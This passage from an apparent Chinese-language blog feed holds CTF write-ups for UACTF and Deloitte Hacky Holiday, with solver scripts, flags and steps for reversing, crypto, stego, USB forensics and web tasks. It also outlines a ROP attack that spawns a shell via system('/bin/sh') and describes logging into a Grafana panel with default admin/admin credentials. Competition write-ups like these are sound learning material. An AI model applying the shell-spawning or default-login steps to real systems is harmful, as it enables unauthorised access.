operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>endptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v1 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&amp;</span>s<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">!=</span> endptr <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v7 <span class="token operator">==</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>依据pwntool，通过自动化地交互，我们得到了字符串的长度以及相关信息。由于服务器已经关闭，所以我们只能采用本地模拟的方式。而且我猜测字符串的长度一定是4的倍数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> repattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d+\.?\d*'</span><span class="token punctuation">)</span><span class="token comment"># conn = remote('challenges.uactf.com.au',30001)</span>conn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./mason'</span><span class="token punctuation">)</span>num_add <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>num_1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num_all_int <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    result <span class="token operator">=</span> <span class="token number">0</span>    str_add <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"concive add :"</span><span class="token operator">+</span> str_add<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"broadcast"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>str_add<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_add is :"</span> <span class="token punctuation">,</span> num_add<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"num_1 is:"</span><span class="token punctuation">,</span> num_1<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the length of flag is "</span><span class="token punctuation">,</span> x<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span>    num_add<span class="token punctuation">.</span>append<span class="token punctuation">(</span> str_add<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>    num_all <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>str_add<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> num_all<span class="token punctuation">:</span>        result <span class="token operator">+=</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span>        num_all_int<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all add number:"</span> <span class="token punctuation">,</span>num_all_int<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"the add result:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    num_1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>num_all<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"send the add result......"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"after the send:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#conn.recvuntil("Voice")</span>    <span class="token comment">#after_recv = str(conn.recvline(keepends=True))</span>    <span class="token comment">#print("server send :"+after_recv)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再通过给出的write_up,即遍历所有可能出现的字符，进行爆破。tab_size中存储的是加数的个数、tab中存放的是每个加法公式中加数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#include &lt;stdio.h></span><span class="token comment">#include &lt;stdlib.h></span><span class="token builtin">int</span> main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __int32_t res<span class="token punctuation">,</span> check<span class="token punctuation">;</span>    __int8_t i<span class="token punctuation">;</span>    <span class="token builtin">int</span> tab_size<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token builtin">int</span> tab<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span><span class="token number">9022031</span><span class="token punctuation">,</span> <span class="token number">12357936</span><span class="token punctuation">,</span> <span class="token number">2415318</span><span class="token punctuation">,</span> <span class="token number">16184558</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">16448419</span><span class="token punctuation">,</span> <span class="token number">7237420</span><span class="token punctuation">,</span> <span class="token number">9131202</span><span class="token punctuation">,</span> <span class="token number">11715763</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">8957279</span><span class="token punctuation">,</span> <span class="token number">10863672</span><span class="token punctuation">,</span> <span class="token number">2527773</span><span class="token punctuation">,</span> <span class="token number">13853931</span><span class="token punctuation">,</span> <span class="token number">12889127</span><span class="token punctuation">,</span> <span class="token number">15656069</span><span class="token punctuation">,</span> <span class="token number">6045003</span><span class="token punctuation">,</span> <span class="token number">13312869</span><span class="token punctuation">,</span> <span class="token number">6678458</span><span class="token punctuation">,</span> <span class="token number">15383265</span><span class="token punctuation">,</span> <span class="token number">6123571</span><span class="token punctuation">,</span> <span class="token number">3391779</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">7118560</span><span class="token punctuation">,</span> <span class="token number">5373450</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">10279125</span><span class="token punctuation">,</span> <span class="token number">6020706</span><span class="token punctuation">,</span> <span class="token number">3765174</span><span class="token punctuation">,</span> <span class="token number">3355417</span><span class="token punctuation">,</span> <span class="token number">13626908</span><span class="token punctuation">,</span> <span class="token number">5507900</span><span class="token punctuation">,</span> <span class="token number">12989108</span><span class="token punctuation">,</span> <span class="token number">6401031</span><span class="token punctuation">,</span> <span class="token number">12006999</span><span class="token punctuation">,</span> <span class="token number">3447729</span><span class="token punctuation">,</span> <span class="token number">5329581</span><span class="token punctuation">,</span> <span class="token number">11520997</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">5455897</span><span class="token punctuation">,</span> <span class="token number">15833397</span><span class="token punctuation">,</span> <span class="token number">7054469</span><span class="token punctuation">,</span> <span class="token number">14893700</span><span class="token punctuation">,</span> <span class="token number">5641234</span><span class="token punctuation">,</span> <span class="token number">12370933</span><span class="token punctuation">,</span> <span class="token number">10464366</span><span class="token punctuation">,</span> <span class="token number">8737845</span><span class="token punctuation">,</span> <span class="token number">8588291</span><span class="token punctuation">,</span> <span class="token number">6607650</span><span class="token punctuation">,</span> <span class="token number">14087216</span><span class="token punctuation">,</span> <span class="token number">6475796</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span><span class="token number">16563743</span><span class="token punctuation">,</span> <span class="token number">15315034</span><span class="token punctuation">,</span> <span class="token number">15623837</span><span class="token punctuation">,</span> <span class="token number">10300268</span><span class="token punctuation">,</span> <span class="token number">11825995</span><span class="token punctuation">,</span> <span class="token number">8497235</span><span class="token punctuation">,</span> <span class="token number">5756897</span><span class="token punctuation">,</span> <span class="token number">2373671</span><span class="token punctuation">,</span> <span class="token number">6551149</span><span class="token punctuation">,</span> <span class="token number">181825</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> <span class="token builtin">len</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token builtin">len</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token builtin">len</span><span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c1 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c1 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c1<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c2 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c2 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c2<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c3 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c3 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c3<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> c4 <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> c4 <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">;</span> c4<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        i <span class="token operator">=</span> c1 <span class="token operator">|</span> <span class="token punctuation">(</span>c2 <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c3 <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c4 <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        srand<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                        res <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>res <span class="token operator">==</span> tab_size<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                            check <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> tab_size<span class="token punctuation">;</span> j<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                res <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>tab<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> res<span class="token punctuation">)</span>                                <span class="token punctuation">&#123;</span>                                    check <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                    <span class="token keyword">break</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">)</span>                            <span class="token punctuation">&#123;</span>                                printf<span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在程序运算一段时间过后，可惜并没有得出运算结果。但是总体上的思路应该是没有问题。在得到最终结果后，需转换为十六进制，再根据大端存储对原来的字符串进行还原。</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h2><h3 id="4-1-Non-textual-Troubles"><a href="#4-1-Non-textual-Troubles" class="headerlink" title="4-1 Non-textual Troubles"></a><strong>4-1 Non-textual Troubles</strong></h3><p>基础的异或加密。题目提供了一个用于加密的 python 程序。</p><p>题目代码主要是从 plaintext.txt 读取明文，利用随机数和字符Unicode码进行异或操作，进而生成密文写入 ciphertext.txt 当中。本题的关键在于加密过程的可逆性，首先随机数使用了种子机制，因此每次生成的随机数是相同的，其次异或操作存在 A^B = C，C^B = A，因此仅需进行相同的加密操作即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/4-1-1.png" alt="18"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;b4d_h4b175_l34d_70_py7h0n2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h2><h3 id="5-1-Welcome"><a href="#5-1-Welcome" class="headerlink" title="5-1 Welcome"></a><strong>5-1 Welcome</strong></h3><p>签到题目，题目提供了该比赛的 Flag 格式，简单复制粘贴即可。</p><h3 id="5-2-Snake-Equality"><a href="#5-2-Snake-Equality" class="headerlink" title="5-2 Snake Equality"></a><strong>5-2 Snake Equality</strong></h3><p>一道关于 Python 内存地址的题目。题目提供了程序的 python 源码。</p><p>题目要求我们输入一个数字 n 和一个字符 c，并要求经过强制类型转换的整型数字 n 和 经过 ord() 函数解码的 c 生成的数字相同，但是加 1 后不同。</p><p>起初与 jackfromeast 进行了简单的思考，可能都在想 ord() 函数处理字符串的一个边界问题，但是并未成功，于是暂时搁置了。后面注意到它使用的是 “is” 而不是 “==”，经查询发现，“ is ”：是要求两个对象要相同，即同一个对象（相同id）；“==”：只需要值相同即可；因此改题目是对python整型内存id的考察，同样查询发现python针对整型中的0-256，会统一分配相同的id，而大于256就会独立分配id。因此我们需要做的就是在256的边界进行操作，即输入 n = 256， 字符为Unicode中对应十进制数字为256的字符即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5NmtIwIgvqppomDYyFEWRw.png" alt="19"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;n07_411_5n4k35_423_8u117_3qu41_45_d3m0n572473d_8y_15_4nd_3qu415&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-3-Blurry-Eyed-Aha"><a href="#5-3-Blurry-Eyed-Aha" class="headerlink" title="5-3 Blurry-Eyed [Aha!]"></a><strong>5-3 Blurry-Eyed</strong> <strong>[Aha!]</strong></h3><p>隐写的题目还是多见多总结，没有更好的办法。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-1.png" alt="20"></p><p>原图没有一丝头绪，看到其他师傅的WriteUp说此图是一张3D图片，需要使用<a href="https://piellardj.github.io/stereogram-solver/">stereogram solver</a>工具来查看。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-2.png" alt="21"></p><h2 id="Forenics"><a href="#Forenics" class="headerlink" title="Forenics"></a><strong>Forenics</strong></h2><h3 id="6-1-Colour-Blind"><a href="#6-1-Colour-Blind" class="headerlink" title="6-1 Colour Blind"></a><strong>6-1 Colour Blind</strong></h3><p>基础的图片隐写题目。题目提供了一个图片。</p><p>简单的使用工具即可，stegSlove 可以进行不同色彩的展示，同时结合题目名称，我们可以发现 Flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-1-1.png" alt="22"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;r37urn_0f_7h3_c0l0r_m31573r&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-2-HID-Table-for-0x2"><a href="#6-2-HID-Table-for-0x2" class="headerlink" title="6-2 HID Table for 0x2"></a><strong>6-2 HID Table for 0x2</strong></h3><p>此题目是USB协议下的Keyboard键盘流量分析。</p><p>首先流量中存在设备1.2.0和设备1.3.0，通过握手信息中DESCRIPTER response device可以得到设备1.3.0为目标键盘，如下所示。所以1.3.1即为键盘通信的目的地址。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-2-1.png" alt="23"></p><p>由于地址不满足ip地址的规范，我们可以使用长度来进行过滤。键盘的按键信息通过中断URB_INTERRUPT来来传输，键的信息存储在Leftover Capture Data的8字节中。其中第一个字节用来表示是否按下shift键，第三个字节表示实际按下的键是什么，通过键盘表的对应可知。所以我们只需要把1.3.1发送的流量中的所有8字节dump下来并取第三字节(第一字节辅助)进行翻译即可。</p><p>值得一提的是，通过以上帖子得到的字符串没有实义，花费了许多时间。后来我发现流量中包含着键盘中的右箭头、左箭头和回车键，分别对应着0x4f,0x50以及0x28，这些键会改变字符串的输入流，所以需要设置一个字符串的指针(光标)来处理。左箭头和后箭头分别对应着左移和右移，回车对应着光标归零。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/NNLFcy8P3GDyx1lMmoUiYg.png" alt="24"></p><p>后半部分为网址，前半部分为网址中应填入的密码。最终获得flag，如下所示。</p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;234d_&#39;3m_4nd_w33p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-3-Infinite-Aha"><a href="#6-3-Infinite-Aha" class="headerlink" title="6-3 Infinite [Aha!]"></a><strong>6-3 Infinite [Aha!]</strong></h3><p>ogg 格式的音频隐写也是第一次见，还是用常规方法 Audacity 分析，发现并不太行，看到其他师傅们的方法和讲解。原因在于 ogg 格式文件是由多个迷你的 oggs 容器构成，因此需要将其多个音频流进行分离，并且流媒体可以通过它的 “序列号”（OggS文件签名后的10个字节）来识别。这里可以使用工具 oggz-tools。</p><pre class="line-numbers language-none"><code class="language-none">apt-get install oggz-toolsoggz rip -i 0 infinite.ogg -o stream0.oggoggz rip -i 1 infinite.ogg -o stream1.oggoggz rip -i 2 infinite.ogg -o stream2.ogg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用 audacity 查看生成的 stream1.ogg 和 stream2.ogg 文件的频谱图，分别获得 flag 的部分，进行拼接即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/forenics-3.png" alt="25"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;t01nf1n1ty4ndb3y0nd&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN-1</title>
      <link href="/2022/08/04/ctf-pwn-1/"/>
      <url>/2022/08/04/ctf-pwn-1/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="先检查保护机制"><a href="#先检查保护机制" class="headerlink" title="先检查保护机制"></a>先检查保护机制</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220522095648.png" alt="保护机制"></p><p>开启了Nx和Relro保护，stack还是可以溢出，但是在stack中写shellcode的方式已经不可以了。因为Nx把数据所在的区域全部标记为不可执行的了。</p><h2 id="查看反编译之后的代码"><a href="#查看反编译之后的代码" class="headerlink" title="查看反编译之后的代码"></a>查看反编译之后的代码</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220608101306.png" alt="反汇编"></p><p>观察到溢出点，<code>gets(v4 ,argv)</code>同时也可以看到程序中引入了system的系统调用，和相应的”/bin/sh”的字符串，所以我们可以通过ROP的方式解题。</p><p>ROP，Return-oriented programming面向返回导向式编程，会借助ret和栈顶，实现控制流的导向。</p><h2 id="关键问题"><a href="#关键问题" class="headerlink" title="关键问题"></a>关键问题</h2><p>system函数需要一个参数 <code>/bin/sh</code>，不能直接让system函数的地址覆盖掉 <code>返回地址</code>。需要利用ROP，将 <code>/bin/sh</code>的地址导入到 <code>rdi</code>寄存器里面，再调用system函数才行。</p><p>这个思路在第一开始，我是明白的。但是我不知道如何将 <code>/bin/sh</code>的地址保存到rdi寄存器里面去。还有就是，不知道这个system的地址到底应该是哪个？是extern里面的，还是plt里面的，亦或是 <code>_system</code>这个函数的？</p><h2 id="PLT原理"><a href="#PLT原理" class="headerlink" title="PLT原理"></a>PLT原理</h2><p>原理的部分，还是要补上。主要就是CSAPP的第七章。慢慢补上就好啦~~</p><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220715161804.png" alt="ROP"></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deloitte Hacky Holiday</title>
      <link href="/2022/08/04/deloitte-hacky-holiday-2022-writeup/"/>
      <url>/2022/08/04/deloitte-hacky-holiday-2022-writeup/</url>
      
        <content type="html"><![CDATA[<p>简介：</p><p>本文Deloitte Hacky Holiday比赛的WriteUp，主办方的题目非常有质量而且梯度拉开非常友好。我们最终在2334只参赛队伍中取得了75名次的成绩，再接再厉！</p><span id="more"></span><p>我们是SCU_HXD: NING0121, meishijia, jackfromeast</p><p>最终的名次：75th / 2334 participated teams</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="Teaser-su-admin"><a href="#Teaser-su-admin" class="headerlink" title="Teaser su admin"></a><strong>Teaser su admin</strong></h3><p>这是一道关于 web 页面的题目，共一关为新手村等级。</p><p>这道题关键在于考察 “F12” 开发者模式的使用。首先题目提供了一张图片，为一个盾牌的设计图，要求我们生成同样的盾牌符号，经过尝试，我们只能生成相同配色，但不包含图案的盾牌如下：</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1.png" alt="1-1"></p><p>因此我们使用开发者模式检查元素后发现，在选择配色和花纹时，存在隐藏（hidden）选项，我们只需要将隐藏选项通过修改标签的 Class 值进行开启，就可以实现相同盾牌图形。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-3.png" alt="1-3"></p><p>生成后，便展示出了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;4DM1N_4PPR0V3D&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-GRAPHING-IT-OUT"><a href="#2-5-GRAPHING-IT-OUT" class="headerlink" title="2-5 GRAPHING IT OUT"></a><strong>2-5 GRAPHING IT OUT</strong></h3><p>第一关，要寻找到一个dashboard，根据题目中的描述需要找到网页中被隐藏的入口。打开网页的源码发现，其中存在被注释掉的a标签，根据路由找到了Grafana系统的入口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/DK-ylZ2Y4MeQzX_WsfrpwA.png" alt="1"></p><p>由于这个系统在之前的课程设计中曾经使用过，初始设置的账号密码均为 admin，经过尝试之后顺利进入到表盘系统中。然后在不同的表盘 General/Sample 中发现了 flag。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;c3deaca3fb4fec9f4900e82b9ee830c6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二关，题目描述要寻找数据，因为之前在课程设计中 grafana 和 influxDB 两个是结合起来使用的。所以就在 grafana 中查看表盘数据的来源，果然使用的是 influxDB。那么根据经验需要查询数据库中是否有想要的数据。influxDB 中的数据是以 bucket 存在的，在数据库的查询页面中，输入 buckets() ,查询之后，发现有 _monitoring_tasks\data\flag, 四个 bucket，然后就是查询flag中的数据</p><pre class="line-numbers language-none"><code class="language-none">from(bucket:&quot;flag&quot;)    |&gt; range(start:0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询到flag为</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;493c709cff326b344f94acfb6f6cfd81&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三关 <strong>Uncompleted</strong></p><h3 id="3-2-HACKY-HOLIDAYS-AIRLINES"><a href="#3-2-HACKY-HOLIDAYS-AIRLINES" class="headerlink" title="3-2 HACKY HOLIDAYS AIRLINES"></a><strong>3-2 HACKY HOLIDAYS 